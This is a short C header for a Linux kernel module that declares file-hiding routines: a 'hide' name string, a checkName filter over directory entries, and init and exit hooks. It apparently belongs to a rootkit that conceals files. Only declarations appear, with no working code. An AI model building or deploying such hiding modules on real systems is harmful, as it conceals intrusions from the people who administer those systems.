#ifndef HIDEFILES_H
#define HIDEFILES_H

#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>
#include <linux/dirent.h>
#include "include.h"

extern char* hide;

bool checkName(int fd, char* name, unsigned short reclen);
int init_hide_files(void);
void exit_hide_files(void);

#endif
